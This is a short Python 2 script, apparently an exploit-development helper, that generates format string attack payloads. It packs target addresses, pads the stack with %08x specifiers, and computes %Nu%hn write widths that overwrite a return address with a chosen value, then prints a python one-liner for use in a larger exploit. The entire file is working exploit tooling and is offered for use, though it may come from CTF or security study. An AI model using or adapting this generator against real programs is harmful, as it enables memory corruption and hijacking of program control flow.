from struct import *

class Formater():
	def __init__(self, overwritten, overwrite, ladjust, stack_align_len=0, junk="JUNK"):
		self.ret_addr 		= overwritten
		self.redirection 	= overwrite
		self.len_adjustment	= ladjust
		self.adjustment 	= "%08x"*ladjust
		self.stack_align	= junk[0]*stack_align_len
		self.splitted_addr	= [self.ret_addr, self.ret_addr+2]
		self.write_steps	= [int(self.redirection & 0xFFFF),int((self.redirection & 0xFFFF0000) >> 16)]
		self.junk			= junk
	
	def python_sploit(self):
		return "python -c 'print \"%s\"'"%repr(self.exploit)[1:-1]
	
	def raw_sploit(self):
		return self.exploit
	
	def run(self):
		print "[+] We need to write %s to %s" % (hex(self.redirection),hex(self.ret_addr))
		buf	 = self.stack_align
		buf += self.junk
		buf += pack("<L", self.splitted_addr[0])
		buf += self.junk
		buf += pack("<L", self.splitted_addr[1])
		buf += self.adjustment

		# We wrote : 
		# 	- A padding of "self.stack_adjust" lenght to align the stack for our addresses not to be splitted
		#	- A JUNK to read before writing in the two lower bytes of the return address
		#	- The address for the two lower bytes of the return address
		#	- A JUNK to read  before writing in the two higher bytes of the return address
		#	- The address for the two higher bytes of the return address
		# 	- An adjustment for our stack to point just before the first JUNK
		#
		# We then need to calculate the number of read bytes before starting our exploit
		read = 4*len(self.stack_align) + 4*2 + 2*len(self.junk) + self.len_adjustment*8
		
		print "[+] We need to write %s to %s (the two lower bytes of the address)" % (hex(self.write_steps[0]),hex(self.splitted_addr[0]))
		to_read = self.write_steps[0]-read
		print "[+] We read %s until now, we then need to read %s" % (hex(read),hex(to_read))
		buf += "%"+str(to_read)+"u%hn"  
		
		read+= to_read
		
		print "[+] We need to write %s to %s (the two lower bytes of the address)" % (hex(self.write_steps[1]),hex(self.splitted_addr[1]))
		to_read = self.write_steps[1]-read
		if to_read <= 0: to_read = to_read + 0x10000
		print "[+] We read %s until now, we then need to read %s" % (hex(read),hex(to_read))
		buf += "%"+str(to_read)+"u%hn"  
		self.exploit = buf
		print "[+] The end, use the following code in your general sploit"
		print self.python_sploit()
		
		
if __name__=="__main__":
	f = Formater(0x01020304,0xdeadbeef, 8)
	f.run()	
